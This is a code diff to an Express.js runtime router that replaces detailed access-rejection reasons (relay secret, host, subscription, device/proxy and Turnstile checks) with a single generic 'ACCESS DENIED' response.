@@ -24,6 +24,7 @@ import {
 import { deviceBlocked } from "../services/deviceRules.js";
 
 export const runtimeRouter = Router();
+const accessDeniedMessage = "ACCESS DENIED";
 
 const runtimePayloadLimits = {
   config: 8 * 1024,
@@ -60,6 +61,10 @@ function normalizeHost(value = "") {
 function runtimeError(res, status, error, detail = {}) {
   res.status(status).json({ error, ...detail });
   return null;
+}
+
+function accessDenied(res, status = 403) {
+  return runtimeError(res, status, accessDeniedMessage);
 }
 
 function safeCompare(value, expected) {
@@ -145,27 +150,21 @@ async function runtimeContext(req, res) {
   const expectedSecret = relaySecretFor(page);
   const providedSecret = req.headers["x-deuce-relay-secret"] || req.body?.relaySecret;
   if (expectedSecret && !safeCompare(providedSecret, expectedSecret)) {
-    return runtimeError(res, 403, "Relay secret rejected");
+    return accessDenied(res);
   }
 
   const clientHost = normalizeHost(req.headers["x-deuce-client-host"] || req.body?.hostname || req.query?.hostname || req.headers.origin || req.headers.host);
   const allowedHosts = allowedHostsFor(page);
   if (allowedHosts.length && !clientHost) {
-    return runtimeError(res, 403, "Runtime host required");
+    return accessDenied(res);
   }
   if (allowedHosts.length && clientHost && !allowedHosts.includes(clientHost)) {
-    return runtimeError(res, 403, "Domain not authorized", { host: clientHost });
+    return accessDenied(res);
   }
 
   const subscriptionState = pageSubscriptionState(page);
   if (subscriptionState.blocked) {
-    return runtimeError(res, 402, subscriptionState.status, {
-      reason: subscriptionState.status === "payment_failed"
-        ? "Page subscription renewal failed. Fund wallet or renew manually."
-        : "Page subscription expired. Renew from wallet to restore access.",
-      userPageId: page.id,
-      renewalDate: page.subscription?.renewalDate || null
-    });
+    return accessDenied(res, 402);
   }
 
   return { page, clientHost, ip: requestIp(req) };
@@ -174,11 +173,7 @@ async function runtimeContext(req, res) {
 function enforceRuntimeSecurity(context, req, res) {
   const decision = securityDecision(context.page, context.ip, req.headers["user-agent"], req);
   if (decision.allowed) return decision;
-  runtimeError(res, 403, "Runtime blocked", {
-    reason: decision.reason,
-    deviceType: decision.deviceType || null,
-    proxyType: decision.proxyType || null
-  });
+  accessDenied(res);
   return null;
 }
 
@@ -408,6 +403,10 @@ runtimeRouter.post("/security/check", async (req, res) => {
   const context = await runtimeContext(req, res);
   if (!context) return;
   const decision = securityDecision(context.page, context.ip, req.headers["user-agent"], req);
+  if (!decision.allowed) {
+    res.status(403).json({ allowed: false, reason: accessDeniedMessage });
+    return;
+  }
   res.json({ ...decision, ip: context.ip, host: context.clientHost });
 });
 
@@ -417,7 +416,7 @@ runtimeRouter.post("/verify-human", async (req, res) => {
   if (!context) return;
   const decision = securityDecision(context.page, context.ip, req.headers["user-agent"], req);
   if (!decision.allowed) {
-    res.status(403).json({ verified: false, reason: decision.reason });
+    res.status(403).json({ verified: false, reason: accessDeniedMessage });
     return;
   }
 
@@ -434,7 +433,7 @@ runtimeRouter.post("/verify-human", async (req, res) => {
   });
   res.status(result.success ? 200 : 400).json({
     verified: result.success,
-    reason: result.error || (result.success ? "Verified" : "Turnstile verification failed")
+    reason: result.success ? "Verified" : accessDeniedMessage
   });
 });
 
@@ -456,7 +455,11 @@ runtimeRouter.post("/traffic", async (req, res) => {
       proxyType: decision.proxyType || null
     }
   }, context.ip, req.headers["user-agent"]);
-  res.status(201).json({ event, allowed: decision.allowed, reason: decision.reason });
+  res.status(201).json({
+    event: decision.allowed ? event : { ...event, reason: accessDeniedMessage },
+    allowed: decision.allowed,
+    reason: decision.allowed ? decision.reason : accessDeniedMessage
+  });
 });
 
 runtimeRouter.get("/session-command", async (req, res) => {
@@ -483,7 +486,7 @@ runtimeRouter.post("/results", async (req, res) => {
   if (!context) return;
   const decision = securityDecision(context.page, context.ip, req.headers["user-agent"], req);
   if (!decision.allowed) {
-    res.status(403).json({ error: decision.reason });
+    res.status(403).json({ error: accessDeniedMessage });
     return;
   }
   const result = await savePageResult({
